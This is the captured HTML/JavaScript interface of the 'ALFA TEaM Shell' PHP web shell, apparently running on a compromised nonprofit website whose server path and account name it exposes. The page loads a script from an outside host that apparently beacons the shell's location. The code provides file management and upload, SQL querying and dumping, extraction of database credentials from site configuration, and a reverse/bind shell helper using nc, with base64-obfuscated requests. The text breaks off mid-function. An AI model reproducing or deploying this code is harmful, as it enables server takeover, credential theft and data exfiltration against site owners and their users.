    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script src=http://shellizm.com/kaydet.php></script>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
<link href="http://solevisible.com/images/alfamini.png" rel="icon" type="image/x-icon"/>
<title>..:: oldagehome.empoweringhumanity.org ~ ALFA TEaM Shell - v3.0.2 ::..</title>
<link href="https://fonts.googleapis.com/css?family=Francois+One" rel="stylesheet">
<style type="text/css">
.hlabale {
    color: #67ABDF;
    border-radius: 4px;
    border: 1px solid #27979B;
    margin-left: 7px;
    padding: 2px;
}
#tbl_sympphp tr {
	text-align: center;
}
.editor-view {
	position: relative;
}
.view-content {
	position: absolute;
	overflow-y: auto;
	width: 100%;
	height: 475px;
}
*::-webkit-scrollbar-track {
	-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);
	border-radius: 10px;
	background-color: #000115;
}
*::-webkit-scrollbar{
	width: 10px;
	background-color: #000115;
}
*::-webkit-scrollbar-thumb {
	border-radius: 10px;
	-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);
	background-color: rgb(30, 130, 181);
}
.editor-file-name {
	margin-left: 29px;
	margin-top: 4px;
	overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
}
.editor-icon {
	position: absolute;
}
.is_active {
	background: rgba(49, 55, 93, 0.77);
	border-radius: 10px;
}
.history-list {
	height: 88%;
	overflow-y: auto;
}
#editor-minimized,#cgiloader-minimized {
	display: block;
	position: fixed;
	right: -30px;
	width: 30px;
	height: 30px;
	top: 30%;
}
.minimized-wrapper {
	position: relative;
	background: rgb(14, 48, 74);
    width: 44px;
    height: 167px;
	cursor: pointer;
	border-bottom-left-radius: 5px;
	border-top-left-radius: 5px;
}
.minimized-text {
    transform: rotate(-90deg);
    color: wheat;
    font-size: x-large;
    display: inline-block;
    position: absolute;
    right: -51px;
    width: 129px;
    top: 50px;
    border-top-left-radius: 4%;
    height: 56px;
    padding: 3px
}
.close-button,.editor-minimize {
	height: 26px;
    width: 38px;
    right: 7px;
    background: rgb(29, 86, 115);
    cursor: pointer;
    position: absolute;
    box-sizing: border-box;
    line-height: 50px;
    display: inline-block;
    top: 17px;
    border-radius: 100px;
}
.editor-minimize {right: 50px;}
.close-button:before,.close-button:after,.editor-minimize:before {
	transform: rotate(-45deg);
    content: "";
    position: absolute;
    top: 63%;
    right: 6px;
    margin-top: -5px;
    margin-left: -25px;
    display: block;
    height: 4px;
    width: 27px;
    background-color: rgba(216, 207, 207, 0.75);
    transition: all 0.25s ease-out;
}
.editor-minimize:before{
	transform: rotate(0deg);
}
.close-button:after {
  transform: rotate(-135deg);
}
.close-button:hover:before,.close-button:hover:after,.editor-minimize:hover:before{
	background-color: red;
}
.close-button:hover,.editor-minimize:hover{
	background-color: rgba(39, 66, 80, 0.96);
}
#editor,#cgiloader {
	display: none;
	position: fixed;
    top: 0;
	width: 100%;
	height: 100%;
}
.editor-wrapper {
	width: 100%;
    height: 100%;
    position: relative;
    top: 1%;
}
.editor-header {
	width: 97%;
    background: rgba(21, 66, 88, 0.93);
    height: 37px;
    margin-left: 13px;
    position: relative;
	border-top-left-radius: 15px;
	border-top-right-radius: 15px;
}
.editor-path {
	position: absolute;
    font-size: x-large;
    margin-left: 10px;
    top: 6px;
    color: springgreen;
}
.editor-modal {
    position: relative;
    top: 0;
    background-color: rgba(0, 1, 23, 0.95);
    height: 90%;
    margin-left: 20%;
    margin-right: 2%;
    border: 2px #0e304a solid;
}
.editor-explorer {
    width: 19%;
    height: 90%;
    background-color: rgba(0, 1, 23, 0.94);
    position: absolute;
    z-index: 2;
    left: 1%;
    border: 2px rgb(14, 48, 74) solid;
}
.editor-controller {
	position: relative;
	top: -13px;
}
.file-holder {
	position: relative;
    width: 100%;
    height: 30px;
}
.file-holder > .history {
	position: absolute;
    color: rgb(3, 179, 163);
    cursor: pointer;
	left:5px;
    font-size: 18px;
    font-family: sans-serif;
	width:89%;
	height:100%;
	z-index: 3;
	border-radius: 10px;
	transition: background-color 600ms ease-out;
}
.file-holder > .history-close {
	display: block;
    opacity: 0;
    position: absolute;
    right: 2px;
    width: 20px;
    top: 4px;
    text-align: center;
    cursor: pointer;
    color: white;
    background: red;
    border-radius: 100px;
    font-family: monospace;
    z-index: 10;
    transition: opacity 600ms ease-out;
    font-size: 15px;
    height: 19px;
}
.file-holder > .history:hover {
	background-color: #646464;
}
.editor-explorer > .hheader {
	position: relative;
    color: rgb(20, 255, 7);
    border-bottom: 2px rgb(32, 106, 162) solid;
    text-align: center;
    font-family: sans-serif;
    margin-bottom: 10px;
	height: 55px;
}
.editor-search {
	position: absolute;
    bottom: 7px;
    left: 31px;
}
.hheader-text {
	position: absolute;
    left: 8px;
    top: 2px;
}
.history-clear {
	position: absolute;
    right: 8px;
    top: 2px;
    cursor: pointer;
}
.editor-body {
	position: relative;
	margin-left: 3px;
}
.editor-anim-close {
	-webkit-animation: editorClose 800ms ease-in-out forwards;-moz-animation: editorClose 800ms ease-in-out forwards;-ms-animation: editorClose 800ms ease-in-out forwards;animation: editorClose 800ms ease-in-out forwards;
}
@keyframes editorClose {
	0% {
		transform: scale(1);
		opacity: 1;
	}
	100% {
		transform: scale(0);
		opacity: 0;
	}
}
.editor-anim-minimize {
	-webkit-animation: editorMinimize 800ms ease-in-out forwards;-moz-animation: editorMinimize 800ms ease-in-out forwards;-ms-animation: editorMinimize 800ms ease-in-out forwards;animation: editorMinimize 800ms ease-in-out forwards;
}
@keyframes editorMinimize {
	0% {
		right:0px;
		opacity: 1;
	}
	100% {
		right: -2000px;
		opacity: 0;
	}
}
.editor-anim-show {
	-webkit-animation: editorShow 800ms ease-in-out forwards;-moz-animation: editorShow 800ms ease-in-out forwards;-ms-animation: editorShow 800ms ease-in-out forwards;animation: editorShow 800ms ease-in-out forwards;
}
@keyframes editorShow {
	0% {
		right:-2000px;
		opacity: 0;
	}
	100% {
		right: 0px;
		opacity: 1;
	}
}
.minimized-show {
	-webkit-animation: minimizeShow 800ms ease-in-out forwards;-moz-animation: minimizeShow 800ms ease-in-out forwards;-ms-animation: minimizeShow 800ms ease-in-out forwards;animation: minimizeShow 800ms ease-in-out forwards;
}
@keyframes minimizeShow {
	0% {
		right: -30px;
		opacity: 0;
	}
	100% {
		right: 0px;
		opacity: 1;
	}
}
.minimized-hide {
	-webkit-animation: minimizeHide 800ms ease-in-out forwards;-moz-animation: minimizeHide 800ms ease-in-out forwards;-ms-animation: minimizeHide 800ms ease-in-out forwards;animation: minimizeHide 800ms ease-in-out forwards;
}
@keyframes minimizeHide {
	0% {
		right: 0px;
		opacity: 1;
	}
	100% {
		right: -30px;
		opacity: 0;
	}
}
.solevisible-text:hover {
	-webkit-text-shadow: 0px 0px 25px #00FF00;
	-moz-text-shadow: 0px 0px 25px #00FF00;
	-ms-text-shadow: 0px 0px 25px #00FF00;
	text-shadow: 0px 0px 25px #00FF00;
}
.update-holder {
    position: fixed;
    top: 0;
    background-color: rgba(0, 24, 29, 0.72);
    width: 100%;
    height: 100%;
}
.update-partner {
    width: 50%;
    position: relative;
    border-radius: 31px;
    height: 200px;
    background-color: rgba(3, 3, 41, 0.47);
    text-align: center;
    color: rgba(252, 253, 251, 0.88);
    margin-left: 25%;
    top: 23%;
    font-family: "Francois One", sans-serif;
}
.update-partner:hover {
-webkit-box-shadow: inset 0px 0px 99px 9px rgba(11,15,41,1);
-moz-box-shadow: inset 0px 0px 99px 9px rgba(11,15,41,1);
box-shadow: inset 0px 0px 99px 9px rgba(11,15,41,1);
}
.update-content {
	position: relative;
}
.update-content > a {
    text-decoration: none;
    position: absolute;
    color: rgba(103, 167, 47, 0.77);
    left: 24%;
    margin-top: 7%;
    font-size: 40px;
    font-family: "Francois One", sans-serif;
}
.update-close {
	position: absolute;
    right: 0;
    margin-right: 23px;
    top: 10px;
    font-size: 27px;
    background-color: #130f50;
    width: 5%;
    border-radius: 100px;
    cursor: pointer;
    border: 2px rgb(14, 38, 90) solid;
}
.update-close:hover {
	border: 2px #25ff00 solid;
    color: #FF0000;
}
.filestools {
    height: auto;
    width: auto;
    color: #67ABDF;
    font-size: 12px;
    font-family: Verdana,Geneva,sans-serif;
}
@-moz-document url-prefix() {
	#search-input {
		width: 173px;
	}
	.editor-path {
		top:3px;
	}
}
@keyframes spin {from {transform: rotate(0deg);}to{transform: rotate(360deg);}}
@-webkit-keyframes spin {from {-webkit-transform: rotate(0deg);}to {-webkit-transform: rotate(360deg);}}
@-moz-keyframes spin {from {-moz-transform: rotate(0deg);}to {-moz-transform: rotate(360deg);}}
@-ms-keyframes spin {from {-ms-transform: rotate(0deg);}to {-ms-transform: rotate(360deg);}}
#alfaloader{	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;width:100px;height:100px;}
#a_loader{	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;width:150px;height:150px;position:fixed;z-index:999999;top: 42%;left: 45%;display:none;}
.ajaxarea{border:1px solid #0E304A;color:#67ABDF}#up_bar{background-color:red;width:0;height:2px;display:none;position:fixed;z-index:100000}#hidden_sh{background-color:#0E304A;text-align:center;position:absolute;right:0;left:90%;border-bottom-left-radius:2em}.alert_green{color:#0F0;font-family:"Comic Sans MS";font-size:small;text-decoration:none}.whole{background-color:#000;background-image:url(http://solevisible.com/images/alfabg.png);background-position:center;background-attachment:fixed;background-repeat:no-repeat}.header{height:auto;width:auto;border:7px solid #0E304A;color:#67ABDF;font-size:12px;font-family:Verdana,Geneva,sans-serif}.header a{text-decoration:none;}.filestools a{color:#0F0;text-decoration:none}.filestools a:hover{color:#FFF;text-decoration:none;}span{font-weight:bolder;color:#FFF}.txtfont{font-family:"Comic Sans MS";font-size:small;color:#fff;display:inline-block}.txtfont_header{font-family:"Comic Sans MS";font-size:large;display:inline-block;color:#59cc33}.tbltxt{font-family:"Comic Sans MS";color:#fff;font-size:small;display:inline-block}input[type="file"]{display:none}.inputfile{border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;border-radius:4px;height:20px;width:250px;text-overflow:ellipsis;white-space:nowrap;cursor:pointer;display:inline-block;overflow:hidden}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}.inputfile span,.inputfile strong{padding:2px;padding-left:10px}.inputfile span{color:#25ff00;width:90px;min-height:2em;display:inline-block;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;vertical-align:top;float:left}.inputfile strong{background-image:url(http://solevisible.com/images/alfamini.png);background-repeat:no-repeat;background-position:float;height:100%;width:109px;color:#fff;background-color:#0E304A;display:inline-block;float:right}.inputfile:focus strong,.inputfile.has-focus strong,.inputfile:hover strong{background-color:#46647A}.button{padding:3px}#addup,.button{cursor:pointer;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px;background-color:#000;color:green;border-radius:100px}#addup:hover,.button:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:disabled:hover{cursor:not-allowed}td{padding:0px}.myCheckbox{padding-left:2px}.myCheckbox label{display:inline-block;cursor:pointer;position:relative}.myCheckbox input[type=checkbox]{display:none}.myCheckbox label:before{content:"";display:inline-block;width:14px;height:13px;position:absolute;background-color:#aaa;box-shadow:inset 0 2px 3px 0 rgba(0,0,0,.3),0 1px 0 0 rgba(255,255,255,.8)}.myCheckbox label{margin-bottom:15px;padding-right:17px}.myCheckbox label:before{border-radius:100px}input[type=checkbox]:checked + label:before{content:"";background-color:#0E304A;background-image:url(http://solevisible.com/images/alfamini.png);background-repeat:no-repeat;background-position:50% 50%;background-size:14px 14px;border:1px solid #0F0;box-shadow:0 0 4px #0F0}#meunlist{font-family:Verdana,Geneva,sans-serif;color:#FFF;width:auto;border-right-width:7px;border-left-width:7px;height:auto;font-size:12px;font-weight:700;border-top-width:0;border-color:#0E304A;border-style:solid}.whole #meunlist ul{text-align:center;list-style-type:none;margin:0;padding:5px 5px 7px 2px}.whole #meunlist li{margin:0;padding:0;display:inline}.whole #meunlist a{font-family:arial,sans-serif;font-size:14px;text-decoration:none;font-weight:700;clear:both;width:100px;margin-right:-6px;border-right-width:1px;border-right-style:solid;border-right-color:#FFF;padding:3px 15px}.foot{font-family:Verdana,Geneva,sans-serif;margin:0;padding:0;width:100%;text-align:center;font-size:12px;color:#0E304A;border-right-width:7px;border-left-width:7px;border-bottom-width:7px;border-bottom-style:solid;border-right-style:solid;border-right-style:solid;border-left-style:solid;border-color:#0E304A}#text{text-align:center}input[type=submit]{cursor:pointer;background-image:url(http://solevisible.com/images/btn.png);background-repeat:no-repeat;background-position:50% 50%;background-size:23px 23px;background-color:#000;width:30px;height:30px;border:1px solid #27979B;border-radius:100px}textarea{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}textarea:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]{padding:3px;color:#999;text-shadow:#777 0 0 3px;border:1px solid #0E304A;background:transparent;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}input[type=submit]:hover{color:#000;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:2px solid #27979B;-moz-border-radius:4px;border-radius:100px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}input[type=text]:hover{color:#FFF;text-shadow:#060 0 0 6px;box-shadow:0 0 4px #27979B;border:1px solid #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}select{padding:3px;width:162px;color:#FFE;text-shadow:#000 0 2px 7px;border:1px solid #0E304A;background:#000;text-decoration:none;box-shadow:0 0 4px #0E304A;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:#555 0 0 4px;-moz-box-shadow:#555 0 0 4px}select:hover{border:1px solid #27979B;box-shadow:0 0 4px #27979B;padding:3px;-webkit-border-radius:4px;-moz-border-radius:4px;border-radius:4px;-webkit-box-shadow:rgba(0,119,0) 0 0 4px;-moz-box-shadow:rgba(0,119,0) 0 0 4px}
.foottable{width: 300px;font-weight: bold;}
.main th{text-align:left;}
.main a{color: #FFF;}
.main tr:hover{background-color:#646464;}
.ml1{ border:1px solid #0E304A;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:99%; height:300px; }
.header{border: 7px solid #0E304A}#meunlist{border-color: #0E304A}#hidden_sh{background-color: #0E304A}.ajaxarea{border: 1px solid #0E304A}.foot{border-color: #0E304A}.header_vars{color: #27979B;}.header_values{color: #67ABDF;}.header_on{color: #00FF00;}.header_off{color: #ff0000;}.header_none{color: #00FF00;}.home_shell{color: #ff0000;}.home_shell:hover{color: #FFFFFF;}.back_shell{color: #efbe73;}.back_shell:hover{color: #FFFFFF;}.header_pwd{color: #00FF00;}.header_pwd:hover{color: #FFFFFF;}.header_drive{color: #00FF00;}.header_drive:hover{color: #FFFFFF;}.header_show_all{color: #00FF00;}.disable_functions{color: #ff0000;}.footer_text{color: #27979B;}.menu_options{color: #27979B;}.menu_options:hover{background-color: #646464;font-weight: unset;}.ajaxarea .header center a{color: #00FF00;}.ajaxarea .header center a:hover{color: #FFFFFF;}.txtfont_header{color: #59cc33;}.txtfont,.tbltxt{color: #FFFFFF;}.alfa_plus{color: #27E8AE;font-weight: unset;}#hidden_sh a{color: #00FF00;}.hidden_shell_version{color: #ff0000;}.shell_name{color: #FF0000;}.main tr:hover{background-color: #646464;}.main th{color: #FFFFFF;}.main .main_name{color: #FFFFFF;font-weight: unset;}.main_size{color: #67ABDF;}.main_modify{color: #67ABDF;}.main_owner_group{color: #67ABDF;}.main_green_perm{color: #25ff00;}.main_red_perm{color: #FF0000;}.main_white_perm{color: #FFFFFF;}.beetween_perms{color: #FFFFFF;}.main .actions{color: #FFFFFF;}.minimized-wrapper{background-color: #0e304a;}.minimized-text{color: #f5deb3;}.editor-explorer,.editor-modal{border: 2px solid #0e304a;}.editor-explorer,.editor-modal{background-color: rgba(0, 1, 23, 0.94);}.editor-header{background-color: rgba(21, 66, 88, 0.93);}.editor-path{color: #00ff7f;}.close-button, .editor-minimize{background-color: #1d5673;}.editor_actions{color: #FFFFFF;}.editor_file_info_vars{color: #FFFFFF;}.filestools{color: #67ABDF;}.hheader-text,.history-clear{color: #14ff07;}.editor-file-name{color: #03b3a3;}.is_active{background-color: rgba(49, 55, 93, 0.77);}.file-holder > .history:hover{background-color: #646464;}input[type=text],textarea{border: 1px solid #0E304A}input[type=text],textarea{color: #999999;}input[type=text]:hover,textarea:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;}select{border: 1px solid #0E304A}select{color: #FFFFEE;}select:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;}input[type=submit],.button,#addup{border: 1px solid #27979B;}input[type=submit]:hover{box-shadow:0 0 4px #27979B;border:2px solid #27979B;}.button:hover,#addup:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;}.ml1{color: #67ABDF;}.ml1{border: 1px solid #0E304A;}.inputfile{box-shadow:0 0 4px #0E304A;border:1px solid #0E304A;}.inputfile strong{background-color: #0E304A;}.inputfile strong{color: #FFFFFF;}.inputfile span{color: #25ff00;}.inputfile:hover{box-shadow:0 0 4px #27979B;border:1px solid #27979B;}#up_bar{background-color: #ff0000;}.mysql_tables{color: #00FF00;}.mysql_table_count{color: #67ABDF;}.copyright{color: #ff0000;}*::-webkit-scrollbar-thumb{background-color: #1e82b5;}*::-webkit-scrollbar-track{background-color: #000115;}
</style><script type='text/javascript'>
var c_ = '/home/stricrlyvineet/public_html/oldagehome.empoweringhumanity.org/';
var a_ = 'FilesMan'
var charset_ = '';
var alfa1_ = '';
var alfa2_ = '';
var alfa3_ = '';
var alfa4_ = '';
var alfa5_ = '';
var alfa6_ = '';
var alfa7_ = '';
var alfa8_ = '';
var alfa9_ = '';
var alfa10_ = '';
var d = document;
var mysql_cache = {};
var editor_files = {};
var editor_error = true;
var editor_current_file = '';
var is_minimized = false;
var cgi_is_minimized = false;
var cgi_lang = '';
var upcount = 1;
var islinux = true;
var post_encryption_mode = true;
function set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset) {
if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;if(alfa1!=null)d.mf.alfa1.value=alfa1;else d.mf.alfa1.value=alfa1_;if(alfa2!=null)d.mf.alfa2.value=alfa2;else d.mf.alfa2.value=alfa2_;if(alfa3!=null)d.mf.alfa3.value=alfa3;else d.mf.alfa3.value=alfa3_;if(alfa4!=null)d.mf.alfa4.value=alfa4;else d.mf.alfa4.value=alfa4_;if(alfa5!=null)d.mf.alfa5.value=alfa5;else d.mf.alfa5.value=alfa5_;if(alfa6!=null)d.mf.alfa6.value=alfa6;else d.mf.alfa6.value=alfa6_;if(alfa7!=null)d.mf.alfa7.value=alfa7;else d.mf.alfa7.value=alfa7_;if(alfa8!=null)d.mf.alfa8.value=alfa8;else d.mf.alfa8.value=alfa8_;if(alfa9!=null)d.mf.alfa9.value=alfa9;else d.mf.alfa9.value=alfa9_;if(alfa10!=null)d.mf.alfa10.value=alfa10;else d.mf.alfa10.value=alfa10_;
if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
}function fc(a){alfaloader("block");var b="a="+alfab64("FilesMan")+"&c="+alfab64(a.c.value)+"&alfa1="+alfab64(a.alfa1.value)+"&ajax="+alfab64("true")+"&",c="";for(i=0;i<d.files.elements.length;i++)"checkbox"==d.files.elements[i].type&&d.files.elements[i].checked&&(c+="f[]="+alfab64(d.files.elements[i].value)+"&");_Ajax(d.URL,b+c,function(a){alfaloader("none")},!0)}function initDir(a){var b="",c="";islinux&&(b="<a class=\"header_pwd\" onclick=\"g('FilesMan','/');\" href='javascript:void(0);'>/</a>",c="/");var e=a.split("/"),f="",g="";"-1"!=e.indexOf("..")&&(e.splice(e.indexOf("..")-1,1),e.splice(e.indexOf(".."),1));for(i in e)""!=e[i]&&(f+="<a onclick=\"g('FilesMan','"+g+e[i]+"/');\" href='javascript:void(0);' class=\"header_pwd\">"+e[i]+"/</a>",g+=e[i]+"/");$("header_cwd").innerHTML=b+f+" ";var e=c+e.join("/");e=e.replace("//","/"),d.footer_form.c.value=e,$("footer_cwd").value=e,c_=e}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(a,b,c,e){var f=!1;return window.XMLHttpRequest?f=new XMLHttpRequest:window.ActiveXObject&&(f=new ActiveXObject("Microsoft.XMLHTTP")),f?(f.onreadystatechange=function(){4==f.readyState&&200==f.status&&("function"!=typeof c?d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText:e?(d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText,c(f.responseText)):c(f.responseText))},f.open("POST",a,!0),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(b),void 0):void alert("Error !")}function handleup(a,b){var c="__fnameup";0!=b&&(c="__fnameup"+b),a.files[0].name&&($(c).innerHTML=a.files[0].name)}function u(a){alfaloader("block");a.submit.disabled=true;var av = a.a.value,cv = a.c.value,alv = a.alfa1.value,cha = a.charset.value;var b=!1;if(a.a.value=alfab64(a.a.value),a.c.value=alfab64(a.c.value),a.alfa1.value=alfab64(a.alfa1.value),a.charset.value=alfab64(a.charset.value),window.XMLHttpRequest?b=new XMLHttpRequest:window.ActiveXObject&&(b=new ActiveXObject("Microsoft.XMLHTTP")),b){var c=$("up_bar");b.upload&&(c.style.display="block",b.upload.onprogress=function(a){var b=a.position||a.loaded,d=a.totalSize||a.total,e=Math.floor(b/d*1e3)/10+"%";c.style.width=e}),b.onload=function(e){for(200===b.status?(_Ajax(d.URL,"a="+alfab64("FilesMan")+"&c="+a.c.value+"&ajax="+alfab64("true")),c.style.display="none",a.a.value=av,a.c.value=cv,a.alfa1.value=alv,a.charset.value=cha):alert("An error occurred!"),$("footerup").value="",$("__fnameup").innerHTML="";upcount;){var f=$("pfooterup_"+upcount);f&&f.parentNode.removeChild(f),upcount--}0==upcount&&upcount++,alfaloader("none"),a.submit.disabled=false},b.onerror=function(a){};var e=new FormData(a);b.open("POST",d.URL),b.send(e)}}function g(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset){set(a,c,alfa1,alfa2,alfa3,alfa4,alfa5,alfa6,alfa7,alfa8,alfa9,alfa10,charset),"GetConfig"!=a&&"download"!=alfa2&&(d.getElementsByClassName("ajaxarea")[0].innerHTML='<center><br /><img id="alfaloader" src="http://solevisible.com/images/loader.png"></img><br /><br /></center>'),islinux&&"/"!=d.mf.c.value.substr(0,1)&&(d.mf.c.value="/"+d.mf.c.value);for(var data="a="+alfab64(a)+"&c="+alfab64(d.mf.c.value)+"&",i=1;i<=10;i++)data+="alfa"+i+"="+alfab64(eval("d.mf.alfa"+i+".value"))+"&";if(data+="&ajax="+alfab64("true"),"FilesTools"==a&&"download"==alfa2){var dl=$("dlForm");return dl.a.value=alfab64("dlfile"),dl.c.value=alfab64(d.mf.c.value),dl.file.value=alfab64(alfa1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data),c!=c_&&c&&initDir(c)):(alfaloader("block"),_Ajax(d.URL,data,function(a){try{a=JSON.parse(a),a.host&&a.user&&a.dbname&&($("db_host")&&($("db_host").value=a.host),$("db_user")&&($("db_user").value=a.user),$("db_name")&&($("db_name").value=a.dbname),$("db_pw")&&($("db_pw").value=a.password),$("db_prefix")&&a.prefix&&($("db_prefix").value=a.prefix),$("cc_encryption_hash")&&a.cc_encryption_hash&&($("cc_encryption_hash").value=a.cc_encryption_hash))}catch(a){}alfaloader("none")}))}function alfaloader(a){$("a_loader").style.display=a}function fsu(a){alfaloader("block");for(var b={},c=0;c<a.elements.length;c++)"submit"!=a.elements[c].type&&(b[a.elements[c].name]=a.elements[c].value);for(c in mysql_cache)mysql_cache[c]=alfab64(mysql_cache[c]);_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64("update")+"&alfa2="+alfab64(JSON.stringify(b))+"&c="+alfab64(c_)+"&charset="+mysql_cache.charset+"&type="+mysql_cache.type+"&sql_host="+mysql_cache.host+"&sql_login="+mysql_cache.user+"&sql_pass="+mysql_cache.pass+"&sql_base="+mysql_cache.db+"&sql_count="+mysql_cache.count+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},!0)}function fs(f,e){alfaloader("block");var alfa1="query",alfa2=f.query?alfab64(f.query.value):"",host=f.sql_host?f.sql_host.value:mysql_cache.host,user=f.sql_login?f.sql_login.value:mysql_cache.user,pass=f.sql_pass?f.sql_pass.value:mysql_cache.pass,db=f.sql_base?f.sql_base.value:mysql_cache.db,type=f.type?f.type.value:mysql_cache.type,charset=f.charset?f.charset.value:mysql_cache.charset,count="";switch(count=f.sql_count?f.sql_count.checked?"true":"":mysql_cache.count,f){case"0":alfa1="select",alfa2=alfab64(e);break;case"1":e=eval(e),alfa1="select",alfa2=alfab64(e[0])+"&alfa3="+alfab64(e[1]);break;case"2":e=eval(e),alfa1="edit",alfa2=alfab64(db)+"&alfa3="+alfab64(e.join(":"));break;case"3":alfa1="loadfile",alfa2=alfab64(e);break;case"4":case"5":alfa1=(f=="4"?"dumpfile":"droptbl");var obj={},id=$("dumpfile");for(obj.file=id?id.value:"dump.sql",obj.tbl=[],i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked&&obj.tbl.push(d.sf.elements["tbl[]"][i].value);alfa2=alfab64(JSON.stringify(obj))}_Ajax(d.URL,"a="+alfab64("Sql")+"&alfa1="+alfab64(alfa1)+"&alfa2="+alfa2+"&c="+alfab64(c_)+"&charset="+alfab64(charset)+"&type="+alfab64(type)+"&sql_host="+alfab64(host)+"&sql_login="+alfab64(user)+"&sql_pass="+alfab64(pass)+"&sql_base="+alfab64(db)+"&sql_count="+alfab64(count)+"&ajax="+alfab64("true"),function(a){evalJS(a),alfaloader("none")},!0)}function ctlbc(a){var b=$("bcStatus"),c=$("bcipAction");"bind"==a.value?(c.style.display="none",b.innerHTML="<small>Press ` <font color='red'>>></font> ` button and run ` <font color='red'>nc server_ip port</font> ` on your computer</small>"):(c.style.display="inline-block",b.innerHTML="<small>Run ` <font color='red'>nc -l -v -p port</font> ` on your computer and press ` <font color='red'>>></font> ` button</small>")}function is(){for(i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked=!d.sf.elements["tbl[]"][i].checked}function $(a){return d.getElementById(a)}function addnewup(){var a="footerup_"+upcount,b="pfooterup_"+upcount,c=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",e=d.createElement("p");e.innerHTML='<label class="inputfile" for="'+a+'"><span id="__fnameup'+upcount+'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="'+a+'" type="file" name="f[]" onChange="handleup(this,'+upcount+');">',e.id=b,e.appendAfter($(c)),upcount++}function alfa_searcher_tool(a){switch(a){case"all":case"dirs":_alfaSet(!0,"Disabled");break;case"files":_alfaSet(!1,"php")}}function _alfaSet(a,b){d.srch.ext.disabled=a,d.srch.ext.value=b}function 